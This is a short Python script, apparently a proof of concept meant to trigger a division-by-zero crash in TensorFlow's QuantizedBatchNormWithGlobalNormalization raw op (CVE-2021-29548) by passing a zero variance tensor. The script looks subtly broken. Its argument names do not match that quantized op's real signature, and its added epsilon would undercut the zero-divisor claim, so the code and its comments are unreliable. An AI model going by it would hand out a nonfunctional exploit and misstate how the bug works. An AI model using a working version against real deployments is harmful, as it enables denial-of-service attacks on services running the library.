import tensorflow as tf

# Example code that may trigger the vulnerability CVE-2021-29548
input_tensor = tf.constant([1, 2, 3], dtype=tf.qint8)
scale = tf.constant([1.0], dtype=tf.float32)
offset = tf.constant([0.0], dtype=tf.float32)
mean = tf.constant([1.0], dtype=tf.float32)
variance = tf.constant([0.0], dtype=tf.float32)  # This can lead to division by zero

# This call may lead to a runtime division by zero error
result = tf.raw_ops.QuantizedBatchNormWithGlobalNormalization(
    input=input_tensor,
    scale=scale,
    offset=offset,
    mean=mean,
    variance=variance,
    epsilon=1e-5
)

print(result)